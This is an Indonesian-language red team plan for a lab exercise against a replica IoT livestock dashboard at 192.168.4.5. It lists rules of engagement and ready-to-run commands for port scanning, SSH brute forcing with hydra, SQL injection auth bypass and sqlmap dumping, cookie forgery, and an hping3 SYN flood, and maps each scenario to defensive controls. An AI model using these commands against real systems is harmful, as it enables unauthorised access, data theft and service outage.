# Red Team Attack Plan — Fase 2 (Minggu 10–11)

Target: **192.168.4.5** (Target Node, replika KABITA). Attacker: **192.168.4.100**.

## Rules of engagement

| Aturan | Isi |
|---|---|
| Lingkup | Hanya `192.168.4.5`; dilarang memindai internet atau sistem Mitra |
| Data | Data sintetis; tidak mengekspor data ke luar lab |
| DoS | Maksimal **satu** skenario, ≤60 detik, satu service, satu IP |
| Waktu | Sesi lab terjadwal; snapshot `20-lab-ready` diambil sebelum tiap skenario |
| Bukti | Setiap langkah disimpan di `docs/redteam/evidence/RT-0X/` |

## Lima skenario

| ID | Kategori | Tujuan | Tools | Sasaran teknis | Indikator berhasil |
|---|---|---|---|---|---|
| RT-01 | Discovery | Memetakan service & versi | `nmap -sV`, `whatweb`, `curl` | 22, 80 | daftar port/versi + teknologi (Nuxt, PostgreSQL tak terekspos) |
| RT-02 | Initial Access | Menebak kredensial SSH | `hydra` (wordlist 20 baris) | `ssh://192.168.4.5` | login `iotadmin` berhasil |
| RT-03 | Data breach | SQL injection pada API & login | `sqlmap`, `curl` | `http://192.168.4.5/api/telemetri?kambing=`, `/api/login` | dump tabel `users`/`telemetri`; auth bypass |
| RT-04 | Spoofing | Memalsukan sesi dashboard | `curl` | cookie `kabita_user` | akses dashboard tanpa kredensial sah |
| RT-05 | Availability | DoS terkontrol 30 detik | `hping3` | `192.168.4.5:80` | dashboard tidak merespons selama serangan, pulih sendiri |

Satu DoS (RT-05) sesuai batas panduan; empat skenario lain bersifat baca/injeksi.

## Langkah ringkas per skenario

### RT-01 — Discovery
```bash
nmap -sn 192.168.4.0/24
nmap -sV -p- --min-rate 2000 192.168.4.5
whatweb -a 3 http://192.168.4.5
curl -s http://192.168.4.5/api/ringkasan
```
**Harapan:** 22 (OpenSSH 10.2), 80 (Nitro/Nuxt). PostgreSQL 5432 **tidak** terlihat = firewall bekerja.
**Kontrol penutup:** B-2 (sudah), C-1.

### RT-02 — Kredensial SSH
```bash
printf 'iotadmin\nadmin\nroot\n' > users.txt
printf '123\nadmin123\npassword\n' > pass.txt
hydra -L users.txt -P pass.txt ssh://192.168.4.5 -t 2 -f
```
**Harapan:** berhasil dengan `iotadmin/123`; fail2ban mencatat kegagalan sebelum itu.
**Kontrol penutup:** A-1, A-2, A-4.

### RT-03 — SQL injection
```bash
# auth bypass
curl -s -X POST http://192.168.4.5/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin'\'' --","password":"x"}'

# injeksi pada parameter kambing
curl -s "http://192.168.4.5/api/telemetri?kambing=1%20OR%201=1&limit=100" | head -c 300

# dump terarah
sqlmap -u "http://192.168.4.5/api/telemetri?kambing=1" --batch --dbs --level 2
```
**Harapan:** seluruh 60 baris telemetri terbaca; tabel `users` (password plaintext) terekspos.
**Kontrol penutup:** C-2.

### RT-04 — Pemalsuan sesi dashboard
```bash
curl -s -H 'Cookie: kabita_user=admin' http://192.168.4.5/ | grep -c 'Dashboard kandang'
```
**Harapan:** dashboard terbuka tanpa login (cookie tidak ditandatangani).
**Kontrol penutup:** A-1, C-1 (cookie `Secure`/`HttpOnly` + sesi bertanda tangan).

### RT-05 — DoS terkontrol
```bash
sudo timeout 30 hping3 -S -p 80 --flood --rand-source 192.168.4.5
# hentikan setelah 30 detik; ukur waktu pemulihan
curl -s -o /dev/null -w '%{http_code} %{time_total}\n' http://192.168.4.5/
```
**Harapan:** dashboard timeout selama serangan, pulih <10 detik setelah dihentikan.
**Kontrol penutup:** B-2 (`ufw limit`), rate limit di aplikasi.

## Pemetaan ke kontrol

| Skenario | Kontrol A | Kontrol B | Kontrol C |
|---|---|---|---|
| RT-01 | — | B-2 | C-1 |
| RT-02 | A-1, A-2, A-4 | — | C-2 (hash) |
| RT-03 | A-1 | — | C-2, C-3 |
| RT-04 | A-1, A-3 | — | C-1 |
| RT-05 | — | B-2 (limit), B-1 | C-3 |
